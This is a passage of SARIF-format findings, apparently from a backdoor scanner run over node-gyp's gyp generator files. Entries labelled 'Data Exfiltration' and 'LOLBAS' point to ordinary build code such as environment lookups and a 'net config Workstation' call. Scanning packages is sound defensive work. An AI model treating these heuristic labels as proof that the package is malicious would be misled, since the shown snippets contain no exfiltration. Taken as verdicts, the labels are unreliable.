                    "text": "\n\ndef _ConfigWindowsTargetPlatformVersion(config_data, version):\n    target_ver = config_data.get(\"msvs_windows_target_platform_version\")\n    if target_ver and re.match(r\"^\\d+\", target_ver):\n        return target_ver\n    config_ver = config_data.get(\"msvs_windows_sdk_version\")\n",
                    "rendered": {
                      "text": "\n\ndef _ConfigWindowsTargetPlatformVersion(config_data, version):\n    target_ver = config_data.get(\"msvs_windows_target_platform_version\")\n    if target_ver and re.match(r\"^\\d+\", target_ver):\n        return target_ver\n    config_ver = config_data.get(\"msvs_windows_sdk_version\")\n",
                      "markdown": "`\n\ndef _ConfigWindowsTargetPlatformVersion(config_data, version):\n    target_ver = config_data.get(\"msvs_windows_target_platform_version\")\n    if target_ver and re.match(r\"^\\d+\", target_ver):\n        return target_ver\n    config_ver = config_data.get(\"msvs_windows_sdk_version\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 308,
                  "startColumn": 22,
                  "endLine": 308,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\n\ndef _ConfigPlatform(config_data):\n    return config_data.get(\"msvs_configuration_platform\", \"Win32\")\n\n\ndef _ConfigBaseName(config_name, platform_name):\n",
                    "rendered": {
                      "text": "\n\ndef _ConfigPlatform(config_data):\n    return config_data.get(\"msvs_configuration_platform\", \"Win32\")\n\n\ndef _ConfigBaseName(config_name, platform_name):\n",
                      "markdown": "`\n\ndef _ConfigPlatform(config_data):\n    return config_data.get(\"msvs_configuration_platform\", \"Win32\")\n\n\ndef _ConfigBaseName(config_name, platform_name):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 304,
                  "startColumn": 22,
                  "endLine": 304,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\n\ndef _ConfigTargetVersion(config_data):\n    return config_data.get(\"msvs_target_version\", \"Windows7\")\n\n\ndef _ConfigPlatform(config_data):\n",
                    "rendered": {
                      "text": "\n\ndef _ConfigTargetVersion(config_data):\n    return config_data.get(\"msvs_target_version\", \"Windows7\")\n\n\ndef _ConfigPlatform(config_data):\n",
                      "markdown": "`\n\ndef _ConfigTargetVersion(config_data):\n    return config_data.get(\"msvs_target_version\", \"Windows7\")\n\n\ndef _ConfigPlatform(config_data):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 288,
                  "startColumn": 11,
                  "endLine": 288,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    tool = tools[tool_name]\n    if setting == \"CompileAsWinRT\":\n        return\n    if tool.get(setting):\n        if only_if_unset:\n            return\n        if type(tool[setting]) == list and type(value) == list:\n",
                    "rendered": {
                      "text": "    tool = tools[tool_name]\n    if setting == \"CompileAsWinRT\":\n        return\n    if tool.get(setting):\n        if only_if_unset:\n            return\n        if type(tool[setting]) == list and type(value) == list:\n",
                      "markdown": "`    tool = tools[tool_name]\n    if setting == \"CompileAsWinRT\":\n        return\n    if tool.get(setting):\n        if only_if_unset:\n            return\n        if type(tool[setting]) == list and type(value) == list:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 283,
                  "startColumn": 16,
                  "endLine": 283,
                  "endColumn": 21,
                  "snippet": {
                    "text": "            value = value.replace(\"/\", \"\\\\\")\n        else:\n            value = [i.replace(\"/\", \"\\\\\") for i in value]\n    if not tools.get(tool_name):\n        tools[tool_name] = {}\n    tool = tools[tool_name]\n    if setting == \"CompileAsWinRT\":\n",
                    "rendered": {
                      "text": "            value = value.replace(\"/\", \"\\\\\")\n        else:\n            value = [i.replace(\"/\", \"\\\\\") for i in value]\n    if not tools.get(tool_name):\n        tools[tool_name] = {}\n    tool = tools[tool_name]\n    if setting == \"CompileAsWinRT\":\n",
                      "markdown": "`            value = value.replace(\"/\", \"\\\\\")\n        else:\n            value = [i.replace(\"/\", \"\\\\\") for i in value]\n    if not tools.get(tool_name):\n        tools[tool_name] = {}\n    tool = tools[tool_name]\n    if setting == \"CompileAsWinRT\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 233,
                  "startColumn": 26,
                  "endLine": 233,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        elif msvs_version and not msvs_version.UsesVcxproj():\n            # For MSVS 2008 and earlier, we need to process all files before walking\n            # the sub folders.\n            if not folders.get(s[0]):\n                folders[s[0]] = []\n            folders[s[0]].append(s[1:])\n        else:\n",
                    "rendered": {
                      "text": "        elif msvs_version and not msvs_version.UsesVcxproj():\n            # For MSVS 2008 and earlier, we need to process all files before walking\n            # the sub folders.\n            if not folders.get(s[0]):\n                folders[s[0]] = []\n            folders[s[0]].append(s[1:])\n        else:\n",
                      "markdown": "`        elif msvs_version and not msvs_version.UsesVcxproj():\n            # For MSVS 2008 and earlier, we need to process all files before walking\n            # the sub folders.\n            if not folders.get(s[0]):\n                folders[s[0]] = []\n            folders[s[0]].append(s[1:])\n        else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 115,
                  "startColumn": 29,
                  "endLine": 115,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    global cached_domain\n    if not cached_domain or not cached_username:\n        domain = os.environ.get(\"USERDOMAIN\")\n        username = os.environ.get(\"USERNAME\")\n        if not domain or not username:\n            call = subprocess.Popen(\n                [\"net\", \"config\", \"Workstation\"], stdout=subprocess.PIPE\n",
                    "rendered": {
                      "text": "    global cached_domain\n    if not cached_domain or not cached_username:\n        domain = os.environ.get(\"USERDOMAIN\")\n        username = os.environ.get(\"USERNAME\")\n        if not domain or not username:\n            call = subprocess.Popen(\n                [\"net\", \"config\", \"Workstation\"], stdout=subprocess.PIPE\n",
                      "markdown": "`    global cached_domain\n    if not cached_domain or not cached_username:\n        domain = os.environ.get(\"USERDOMAIN\")\n        username = os.environ.get(\"USERNAME\")\n        if not domain or not username:\n            call = subprocess.Popen(\n                [\"net\", \"config\", \"Workstation\"], stdout=subprocess.PIPE\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 114,
                  "startColumn": 27,
                  "endLine": 114,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    global cached_username\n    global cached_domain\n    if not cached_domain or not cached_username:\n        domain = os.environ.get(\"USERDOMAIN\")\n        username = os.environ.get(\"USERNAME\")\n        if not domain or not username:\n            call = subprocess.Popen(\n",
                    "rendered": {
                      "text": "    global cached_username\n    global cached_domain\n    if not cached_domain or not cached_username:\n        domain = os.environ.get(\"USERDOMAIN\")\n        username = os.environ.get(\"USERNAME\")\n        if not domain or not username:\n            call = subprocess.Popen(\n",
                      "markdown": "`    global cached_username\n    global cached_domain\n    if not cached_domain or not cached_username:\n        domain = os.environ.get(\"USERDOMAIN\")\n        username = os.environ.get(\"USERNAME\")\n        if not domain or not username:\n            call = subprocess.Popen(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2941,
                  "startColumn": 14,
                  "endLine": 2941,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n    ):\n        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n\n",
                    "rendered": {
                      "text": "\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n    ):\n        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n\n",
                      "markdown": "`\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n    ):\n        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2940,
                  "startColumn": 11,
                  "endLine": 2940,
                  "endColumn": 22,
                  "snippet": {
                    "text": "    ]\n\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n    ):\n        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n",
                    "rendered": {
                      "text": "    ]\n\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n    ):\n        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n",
                      "markdown": "`    ]\n\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n    ):\n        properties[0].append([\"PreferredToolArchitecture\", \"x64\"])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2030,
                  "startColumn": 14,
                  "endLine": 2030,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    # contains the actual word size of the system when running thru WOW64).\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\").find(\"64\") >= 0\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\", \"\").find(\"64\") >= 0\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n    else:\n",
                    "rendered": {
                      "text": "    # contains the actual word size of the system when running thru WOW64).\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\").find(\"64\") >= 0\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\", \"\").find(\"64\") >= 0\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n    else:\n",
                      "markdown": "`    # contains the actual word size of the system when running thru WOW64).\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\").find(\"64\") >= 0\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\", \"\").find(\"64\") >= 0\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 2029,
                  "startColumn": 11,
                  "endLine": 2029,
                  "endColumn": 22,
                  "snippet": {
                    "text": "    # process), it is also necessary to check PROCESSOR_ARCITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\").find(\"64\") >= 0\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\", \"\").find(\"64\") >= 0\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n",
                    "rendered": {
                      "text": "    # process), it is also necessary to check PROCESSOR_ARCITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\").find(\"64\") >= 0\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\", \"\").find(\"64\") >= 0\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n",
                      "markdown": "`    # process), it is also necessary to check PROCESSOR_ARCITEW6432 (which\n    # contains the actual word size of the system when running thru WOW64).\n    if (\n        os.environ.get(\"PROCESSOR_ARCHITECTURE\", \"\").find(\"64\") >= 0\n        or os.environ.get(\"PROCESSOR_ARCHITEW6432\", \"\").find(\"64\") >= 0\n    ):\n        default_variables[\"MSVS_OS_BITS\"] = 64\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1738,
                  "startColumn": 8,
                  "endLine": 1738,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    if \"run_as\" in spec:\n        run_as = spec[\"run_as\"]\n        action = run_as.get(\"action\", [])\n        environment = run_as.get(\"environment\", [])\n        working_directory = run_as.get(\"working_directory\", \".\")\n    elif int(spec.get(\"test\", 0)):\n        action = [\"$(TargetPath)\", \"--gtest_print_time\"]\n",
                    "rendered": {
                      "text": "    if \"run_as\" in spec:\n        run_as = spec[\"run_as\"]\n        action = run_as.get(\"action\", [])\n        environment = run_as.get(\"environment\", [])\n        working_directory = run_as.get(\"working_directory\", \".\")\n    elif int(spec.get(\"test\", 0)):\n        action = [\"$(TargetPath)\", \"--gtest_print_time\"]\n",
                      "markdown": "`    if \"run_as\" in spec:\n        run_as = spec[\"run_as\"]\n        action = run_as.get(\"action\", [])\n        environment = run_as.get(\"environment\", [])\n        working_directory = run_as.get(\"working_directory\", \".\")\n    elif int(spec.get(\"test\", 0)):\n        action = [\"$(TargetPath)\", \"--gtest_print_time\"]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1709,
                  "startColumn": 18,
                  "endLine": 1709,
                  "endColumn": 68,
                  "snippet": {
                    "text": "def _AddActions(actions_to_add, spec, relative_path_of_gyp_file):\n    # Add actions.\n    actions = spec.get(\"actions\", [])\n    # Don't setup_env every time. When all the actions are run together in one\n    # batch file in VS, the PATH will grow too long.\n    # Membership in this set means that the cygwin environment has been set up,\n    # and does not need to be set up again.\n",
                    "rendered": {
                      "text": "def _AddActions(actions_to_add, spec, relative_path_of_gyp_file):\n    # Add actions.\n    actions = spec.get(\"actions\", [])\n    # Don't setup_env every time. When all the actions are run together in one\n    # batch file in VS, the PATH will grow too long.\n    # Membership in this set means that the cygwin environment has been set up,\n    # and does not need to be set up again.\n",
                      "markdown": "`def _AddActions(actions_to_add, spec, relative_path_of_gyp_file):\n    # Add actions.\n    actions = spec.get(\"actions\", [])\n    # Don't setup_env every time. When all the actions are run together in one\n    # batch file in VS, the PATH will grow too long.\n    # Membership in this set means that the cygwin environment has been set up,\n    # and does not need to be set up again.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 115,
                  "startColumn": 22,
                  "endLine": 115,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    global cached_domain\n    if not cached_domain or not cached_username:\n        domain = os.environ.get(\"USERDOMAIN\")\n        username = os.environ.get(\"USERNAME\")\n        if not domain or not username:\n            call = subprocess.Popen(\n                [\"net\", \"config\", \"Workstation\"], stdout=subprocess.PIPE\n",
                    "rendered": {
                      "text": "    global cached_domain\n    if not cached_domain or not cached_username:\n        domain = os.environ.get(\"USERDOMAIN\")\n        username = os.environ.get(\"USERNAME\")\n        if not domain or not username:\n            call = subprocess.Popen(\n                [\"net\", \"config\", \"Workstation\"], stdout=subprocess.PIPE\n",
                      "markdown": "`    global cached_domain\n    if not cached_domain or not cached_username:\n        domain = os.environ.get(\"USERDOMAIN\")\n        username = os.environ.get(\"USERNAME\")\n        if not domain or not username:\n            call = subprocess.Popen(\n                [\"net\", \"config\", \"Workstation\"], stdout=subprocess.PIPE\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 114,
                  "startColumn": 20,
                  "endLine": 114,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    global cached_username\n    global cached_domain\n    if not cached_domain or not cached_username:\n        domain = os.environ.get(\"USERDOMAIN\")\n        username = os.environ.get(\"USERNAME\")\n        if not domain or not username:\n            call = subprocess.Popen(\n",
                    "rendered": {
                      "text": "    global cached_username\n    global cached_domain\n    if not cached_domain or not cached_username:\n        domain = os.environ.get(\"USERDOMAIN\")\n        username = os.environ.get(\"USERNAME\")\n        if not domain or not username:\n            call = subprocess.Popen(\n",
                      "markdown": "`    global cached_username\n    global cached_domain\n    if not cached_domain or not cached_username:\n        domain = os.environ.get(\"USERDOMAIN\")\n        username = os.environ.get(\"USERNAME\")\n        if not domain or not username:\n            call = subprocess.Popen(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2932,
                  "startColumn": 5,
                  "endLine": 2932,
                  "endColumn": 13,
                  "snippet": {
                    "text": "\n\ndef GenerateOutput(target_list, target_dicts, data, params):\n    # Update target_dicts for iOS device builds.\n    target_dicts = gyp.xcode_emulation.CloneConfigurationForDeviceAndEmulator(\n        target_dicts\n    )\n",
                    "rendered": {
                      "text": "\n\ndef GenerateOutput(target_list, target_dicts, data, params):\n    # Update target_dicts for iOS device builds.\n    target_dicts = gyp.xcode_emulation.CloneConfigurationForDeviceAndEmulator(\n        target_dicts\n    )\n",
                      "markdown": "`\n\ndef GenerateOutput(target_list, target_dicts, data, params):\n    # Update target_dicts for iOS device builds.\n    target_dicts = gyp.xcode_emulation.CloneConfigurationForDeviceAndEmulator(\n        target_dicts\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2806,
                  "startColumn": 24,
                  "endLine": 2806,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n        # If build_file is a symlink, we must not follow it because there's a chance\n        # it could point to a path above toplevel_dir, and we cannot correctly deal\n        # with that case at the moment.\n        build_file = gyp.common.RelativePath(build_file, options.toplevel_dir, False)\n\n        qualified_target_for_hash = gyp.common.QualifiedTarget(\n",
                    "rendered": {
                      "text": "\n        # If build_file is a symlink, we must not follow it because there's a chance\n        # it could point to a path above toplevel_dir, and we cannot correctly deal\n        # with that case at the moment.\n        build_file = gyp.common.RelativePath(build_file, options.toplevel_dir, False)\n\n        qualified_target_for_hash = gyp.common.QualifiedTarget(\n",
                      "markdown": "`\n        # If build_file is a symlink, we must not follow it because there's a chance\n        # it could point to a path above toplevel_dir, and we cannot correctly deal\n        # with that case at the moment.\n        build_file = gyp.common.RelativePath(build_file, options.toplevel_dir, False)\n\n        qualified_target_for_hash = gyp.common.QualifiedTarget(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2192,
                  "startColumn": 28,
                  "endLine": 2192,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        restat=True,\n        pool=\"link_pool\",\n    )\n    # Note that ldflags goes at the end so that it has the option of\n    # overriding default settings earlier in the command line.\n    exe_cmd = (\n        \"%s gyp-win-tool link-wrapper $arch %s \"\n",
                    "rendered": {
                      "text": "        restat=True,\n        pool=\"link_pool\",\n    )\n    # Note that ldflags goes at the end so that it has the option of\n    # overriding default settings earlier in the command line.\n    exe_cmd = (\n        \"%s gyp-win-tool link-wrapper $arch %s \"\n",
                      "markdown": "`        restat=True,\n        pool=\"link_pool\",\n    )\n    # Note that ldflags goes at the end so that it has the option of\n    # overriding default settings earlier in the command line.\n    exe_cmd = (\n        \"%s gyp-win-tool link-wrapper $arch %s \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1946,
                  "startColumn": 53,
                  "endLine": 1946,
                  "endColumn": 59,
                  "snippet": {
                    "text": "        args = [self.ExpandSpecial(arg, self.base_to_build) for arg in args]\n        if self.flavor == \"win\":\n            rspfile = rule_name + \".$unique_name.rsp\"\n            # The cygwin case handles this inside the bash sub-shell.\n            run_in = \"\" if win_shell_flags.cygwin else \" \" + self.build_to_base\n            if win_shell_flags.cygwin:\n                rspfile_content = self.msvs_settings.BuildCygwinBashCommandLine(\n",
                    "rendered": {
                      "text": "        args = [self.ExpandSpecial(arg, self.base_to_build) for arg in args]\n        if self.flavor == \"win\":\n            rspfile = rule_name + \".$unique_name.rsp\"\n            # The cygwin case handles this inside the bash sub-shell.\n            run_in = \"\" if win_shell_flags.cygwin else \" \" + self.build_to_base\n            if win_shell_flags.cygwin:\n                rspfile_content = self.msvs_settings.BuildCygwinBashCommandLine(\n",
                      "markdown": "`        args = [self.ExpandSpecial(arg, self.base_to_build) for arg in args]\n        if self.flavor == \"win\":\n            rspfile = rule_name + \".$unique_name.rsp\"\n            # The cygwin case handles this inside the bash sub-shell.\n            run_in = \"\" if win_shell_flags.cygwin else \" \" + self.build_to_base\n            if win_shell_flags.cygwin:\n                rspfile_content = self.msvs_settings.BuildCygwinBashCommandLine(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1522,
                  "startColumn": 34,
                  "endLine": 1522,
                  "endColumn": 40,
                  "snippet": {
                    "text": "                # If an rspfile contains spaces, ninja surrounds the filename with\n                # quotes around it and then passes it to open(), creating a file with\n                # quotes in its name (and when looking for the rsp file, the name\n                # makes it through bash which strips the quotes) :-/\n                link_file_list = link_file_list.replace(\" \", \"_\")\n                extra_bindings.append(\n                    (\n",
                    "rendered": {
                      "text": "                # If an rspfile contains spaces, ninja surrounds the filename with\n                # quotes around it and then passes it to open(), creating a file with\n                # quotes in its name (and when looking for the rsp file, the name\n                # makes it through bash which strips the quotes) :-/\n                link_file_list = link_file_list.replace(\" \", \"_\")\n                extra_bindings.append(\n                    (\n",
                      "markdown": "`                # If an rspfile contains spaces, ninja surrounds the filename with\n                # quotes around it and then passes it to open(), creating a file with\n                # quotes in its name (and when looking for the rsp file, the name\n                # makes it through bash which strips the quotes) :-/\n                link_file_list = link_file_list.replace(\" \", \"_\")\n                extra_bindings.append(\n                    (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
